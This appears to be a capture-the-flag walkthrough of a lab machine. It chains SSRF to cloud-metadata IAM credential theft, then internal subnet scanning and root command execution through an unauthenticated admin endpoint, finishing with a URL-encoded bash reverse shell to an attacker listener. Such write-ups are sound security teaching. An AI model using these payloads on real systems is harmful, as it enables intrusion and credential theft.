---
title: "HTB Machine Walkthrough: Chaining SSRF → Internal API Abuse → RCE"
date: 2024-12-05
tags: [#htb, #ssrf, #rce, #webapp, #writeup]
excerpt: Full walkthrough of an HTB machine involving SSRF to reach an internal metadata service, leveraging it to extract credentials, then chaining into RCE via a misconfigured internal API.
---

# HTB Machine Walkthrough: Chaining SSRF → Internal API Abuse → RCE

> **Note:** Machine name redacted as per HTB responsible disclosure policy until official retirement.

This machine was rated **Hard**. The intended path chains three separate vulnerabilities — none of which is individually critical, but together result in full system compromise. Exactly the kind of chain you find in real engagements.

## Enumeration

```bash
# Nmap full port scan
nmap -sC -sV -p- -oA scans/full 10.10.11.xxx --min-rate 5000

# Results
22/tcp   open  ssh     OpenSSH 8.9p1
80/tcp   open  http    nginx/1.24.0  
8080/tcp closed
3000/tcp open  http    Node.js (Express)
```

Two web services. Start with port 80.

### Port 80 — Marketing Site

Standard nginx-proxied site. Not much here. Directory scan:

```bash
ffuf -u http://10.10.11.xxx/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,403
```

Notable: `/api/v1/` — returns 403 from external. But...

### Port 3000 — Internal API (Node.js/Express)

This one is more interesting. Swagger docs exposed at `/api-docs`:

```
GET  /health
GET  /fetch?url=<URL>        ← interesting
POST /render
GET  /internal/config
```

The `/fetch` endpoint immediately screams SSRF.

## SSRF Exploitation

```bash
# Test with Burp Collaborator / interactsh
curl "http://10.10.11.xxx:3000/fetch?url=https://YOUR.interactsh.com/test"

# Got callback! SSRF confirmed.
```

Now probe internal services:

```bash
# Check AWS metadata (this is a cloud machine)
curl "http://10.10.11.xxx:3000/fetch?url=http://169.254.169.254/latest/meta-data/"

# Response proxied back:
# ami-id
# ami-launch-index
# hostname
# iam/
# ...
```

Cloud metadata accessible. Escalate:

```bash
# IAM credentials
curl "http://10.10.11.xxx:3000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns: htb-machine-role

curl "http://10.10.11.xxx:3000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/htb-machine-role"
```

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-12-05T..."
}
```

Credentials obtained. But we can go further.

## Internal Network Discovery via SSRF

The machine is on a private subnet. Time to scan:

```bash
# Scan internal subnet via SSRF
for i in $(seq 1 254); do
  resp=$(curl -s "http://10.10.11.xxx:3000/fetch?url=http://172.17.0.$i:8080/" 2>&1)
  if [[ "$resp" != *"Connection refused"* && "$resp" != *"timeout"* ]]; then
    echo "172.17.0.$i:8080 - ALIVE"
  fi
done
```

Found: `172.17.0.4:8080` — an internal admin panel.

## Internal Admin API → RCE

The internal admin panel has a `/exec` endpoint (never exposed externally):

```bash
curl "http://10.10.11.xxx:3000/fetch?url=http://172.17.0.4:8080/admin/exec?cmd=id"
```

```
uid=0(root) gid=0(root) groups=0(root)
```

**RCE as root.** Get a reverse shell:

```bash
# URL-encode a bash reverse shell
curl "http://10.10.11.xxx:3000/fetch?url=http://172.17.0.4:8080/admin/exec?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.xx/4444%200>%261'"
```

Catch it:

```bash
nc -lvnp 4444
# Connection received!
# root@htb-machine:/#
```

## Flags

```bash
cat /home/user/user.txt  # Already had this via API earlier
cat /root/root.txt
```

## Chain Summary

```
External SSRF → Cloud Metadata → IAM Credentials
         ↓
Internal Network Discovery → Admin Panel
         ↓
/admin/exec → RCE as Root
```

## Key Takeaways

1. **SSRF + Cloud metadata = credential theft** — Always check 169.254.169.254 (AWS), 169.254.169.254 (Azure uses same), metadata.google.internal
2. **Internal services trust internal callers** — The admin API had no auth because it assumed only internal traffic. SSRF bridges external and internal.
3. **Network segmentation matters** — If the admin container was on a different subnet than the SSRF-vulnerable service, this chain breaks.

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port/service enumeration |
| ffuf | Directory fuzzing |
| curl | SSRF exploitation |
| interactsh | Out-of-band SSRF detection |
| netcat | Reverse shell handler |

---

*Happy hacking. Always on authorized targets.*
